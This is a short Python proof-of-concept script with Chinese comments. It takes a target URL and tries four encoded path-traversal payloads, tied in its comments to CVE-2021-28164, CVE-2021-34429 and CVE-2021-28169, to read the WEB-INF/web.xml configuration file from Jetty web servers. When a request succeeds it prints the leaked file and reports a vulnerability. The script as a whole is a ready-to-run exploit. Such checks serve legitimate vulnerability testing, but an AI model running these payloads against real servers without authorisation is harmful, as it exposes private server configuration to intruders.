import urllib.request
import urllib.parse
import sys

# 获取一个url地址
try:
    url = sys.argv[1]
except Exception as error:
    print ("请输入地址 如https://www.baidu.com")

# 设置payload，可在后面继续添加
list = ["/%2e/WEB-INF/web.xml","/%u002e/WEB-INF/web.xml","/.%00/WEB-INF/web.xml","/static?/%2557EB-INF/web.xml"]
# payload[0] ="/%2e/WEB-INF/web.xml" CVE-2021-28164
# payload[1] ="/%u002e/WEB-INF/web.xml" CVE-2021-34429
# payload[2] ="/.%00/WEB-INF/web.xml" CVE-2021-34429
# payload[3] ="/static?/%2557EB-INF/web.xml" CVE-2021-28169

# 循环尝试payload
for payload in list:
    try:
        # 通过url+payload的方式进行地址拼接
        poc_url = url + payload
        print (poc_url)
        # 发送不带参数的GET请求，请求地址为输入的url+payload
        response = urllib.request.urlopen(poc_url)
    #调用status属性可以此次请求响应的状态码，200表示此次请求成功
    #    print(response.status)
        # 如果响应码为200，说明文件存在
        if response.status == 200:
            print("===============================存在漏洞===============================")
            # 读取文件具体内容
            print(response.read().decode('utf-8'))
            #由于使用read方法拿到的响应的数据是二进制数据，所有需要使用decode解码成utf-8编码
            print("===============================存在漏洞===============================\n\n")
    except Exception as error:
        print("===============================未发现漏洞===============================\n\n")
